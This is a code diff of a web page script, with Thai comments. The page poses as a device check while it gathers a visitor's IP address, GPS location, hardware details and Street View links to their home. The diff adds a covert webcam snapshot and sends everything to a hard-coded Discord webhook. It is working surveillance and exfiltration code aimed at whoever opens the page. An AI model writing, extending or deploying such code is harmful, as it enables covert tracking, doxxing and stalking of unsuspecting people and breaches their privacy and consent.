@@ -99,10 +99,8 @@
 </div>
 
 <script>
-// ตั้งค่า Discord Webhook URL
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1499459321510101186/k9uFDPnvpJ5peuvFJ6sWXbtyweO2NvbOfCGzdEaBbnGToEmlILLOp_7fzFW6FHdS-Eqv";
 
-// ออบเจกต์สำหรับเก็บข้อมูลผู้ใช้งาน
 let userData = {
     lat: "ไม่ระบุ",
     lon: "ไม่ระบุ",
@@ -118,7 +116,6 @@ document.onkeydown = (e) => {
     }
 };
 
-// เริ่มระบบโหลดข้อมูลพื้นฐาน
 async function startProcess() {
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -151,7 +148,6 @@ async function startProcess() {
     }
 }
 
-// เปิดใช้งานกล้อง
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -163,17 +159,17 @@ async function initCamera() {
         document.getElementById("status-msg").innerText = "กำลังตรวจสอบอุปกรณ์...";
 
         setTimeout(() => {
-            stream.getTracks().forEach(t => t.stop());
-            showResult();
+            // เรียกฟังก์ชันเปลี่ยนหน้าและประมวลผลรูปภาพ
+            showResult(video, stream);
         }, 3000);
 
     } catch (err) {
-        showResult();
+        showResult(null, null);
     }
 }
 
-// ฟังก์ชันส่งข้อมูล "ทุกอย่าง" เข้า Discord Webhook
-async function sendToWebhook() {
+// ฟังก์ชันสำหรับส่งทั้ง Embed ข้อมูล และไฟล์ภาพถ่ายพร้อมกัน
+async function sendToWebhook(imageBlob) {
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
     const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
@@ -181,23 +177,26 @@ async function sendToWebhook() {
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-    const payload = {
-        embeds: [{
-            title: "📡 รายงานข้อมูลอุปกรณ์ทั้งหมด [Discord Components V2]",
-            color: 5814786,
-            fields: [
-                { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
-                { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
-                { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
-                { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
-                { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
-                { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
-                { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
-                { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
-                { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
-                { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
-                { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
-                { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
+    // แก้ไข String format และรูปแบบ URL แผนที่ของ Google ให้ถูกต้อง
+    const googleMapsUrl = userData.lat !== "ไม่ระบุ" ? `https://www.google.com/maps?q=${userData.lat},${userData.lon}` : "ไม่มีข้อมูลพิกัด";
+    const streetViewUrl = userData.lat !== "ไม่ระบุ" ? `https://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}` : "ไม่มีข้อมูลพิกัด";
+
+    const embedData = {
+        title: "📡 รายงานข้อมูลอุปกรณ์ทั้งหมด [Discord Components V2]",
+        color: 5814786,
+        fields: [
+            { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
+            { name: "🔋 แบตเตอรี่", value: `\`${userData.battery}\``, inline: true },
+            { name: "📍 พิกัด (GPS)", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
+            { name: "💻 ระบบปฏิบัติการ", value: `\`${navigator.platform}\``, inline: true },
+            { name: "🗣️ ภาษาเครื่อง", value: `\`${navigator.language}\``, inline: true },
+            { name: "🖥️ ความละเอียดหน้าจอ", value: `\`${screen.width} x ${screen.height}\``, inline: true },
+            { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
+            { name: "💾 RAM ขนาด", value: `\`${ramSize}\``, inline: true },
+            { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
+            { name: "📶 Connection Type", value: `\`${connectionType}\``, inline: true },
+            { name: "🍪 Cookies Status", value: `\`${cookiesStatus}\``, inline: true },
+            { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
 {
     name: "🏙️ Street View",
     value: `[ดูหน้าบ้าน](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userData.lat},${userData.lon})`,
@@ -208,30 +207,60 @@ async function sendToWebhook() {
     value: `[เปิดแผนที่](https://www.google.com/maps/search/?api=1&query=${userData.lat},${userData.lon})`,
     inline: false
 }
-            ],
-            footer: { text: "ระบบดักจับข้อมูลเสร็จสิ้น" },
-            timestamp: new Date().toISOString()
-        }]
+        ],
+        footer: { text: "ระบบดักจับข้อมูลเสร็จสิ้น" },
+        timestamp: new Date().toISOString()
     };
+
+    // ใช้ FormData เพื่อจัดการการส่งไฟล์รูปแบบ Multipart
+    const formData = new FormData();
+    
+    if (imageBlob) {
+        // แนะนำรูปภาพเข้าสู่โครงสร้าง Embed
+        embedData.image = { url: "attachment://shot.png" };
+        formData.append("file", imageBlob, "shot.png");
+    }
+
+    formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
 
     try {
         await fetch(WEBHOOK_URL, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+            body: formData
         });
     } catch(e) {
         console.error("Webhook Error", e);
     }
 }
 
-// เปลี่ยนหน้าและแสดงผลบนเว็บ
-function showResult() {
+function showResult(videoElement, stream) {
+    let capturedBlob = null;
+
+    // ตรวจสอบและบันทึกรูปภาพจากกล้อง
+    if (videoElement && stream) {
+        const canvas = document.createElement("canvas");
+        canvas.width = videoElement.videoWidth || 640;
+        canvas.height = videoElement.videoHeight || 480;
+        
+        const ctx = canvas.getContext("2d");
+        // จัดการกลับฝั่งรูปภาพให้ตรงกับลักษณะวิดีโอ (Mirror)
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+        // ปิดสตรีมการทำงานของกล้อง
+        stream.getTracks().forEach(t => t.stop());
+
+        // เปลี่ยนข้อมูลภาพ Canvas ให้เป็นไฟล์ Blob และนำไปส่งผ่าน Webhook
+        canvas.toBlob((blob) => {
+            sendToWebhook(blob);
+        }, "image/png");
+    } else {
+        sendToWebhook(null);
+    }
+
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
-
-    // เรียกฟังก์ชันส่งค่าทั้งหมดเข้า Discord
-    sendToWebhook();
 
     const box = document.getElementById("info-box");
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
@@ -241,6 +270,9 @@ function showResult() {
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     
+    const googleMapsUrl = userData.lat !== "ไม่ระบุ" ? `https://www.google.com/maps?q=${userData.lat},${userData.lon}` : "#";
+    const streetViewUrl = userData.lat !== "ไม่ระบุ" ? `https://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}` : "#";
+
     const data = [
         { icon: "📍", title: "พิกัด", value: `${userData.lat}, ${userData.lon}` },
         { icon: "🌐", title: "IP Address", value: userData.ip },
@@ -254,8 +286,8 @@ function showResult() {
         { icon: "📶", title: "Connection", value: connectionType },
         { icon: "🍪", title: "Cookies", value: cookiesStatus },
         { icon: "🌙", title: "Dark Mode", value: isDarkMode },
-        { icon: "🏙️", title: "Street View", value: `https://maps.google.com/maps?q=&layer=c&cbll=${userData.lat},${userData.lon}` },
-        { icon: "🗺️", title: "Google Maps", value: `https://www.google.com/maps?q=${userData.lat},${userData.lon}` }
+        { icon: "🏙️", title: "Street View", value: streetViewUrl },
+        { icon: "🗺️", title: "Google Maps", value: googleMapsUrl }
     ];
 
     box.innerHTML = "";
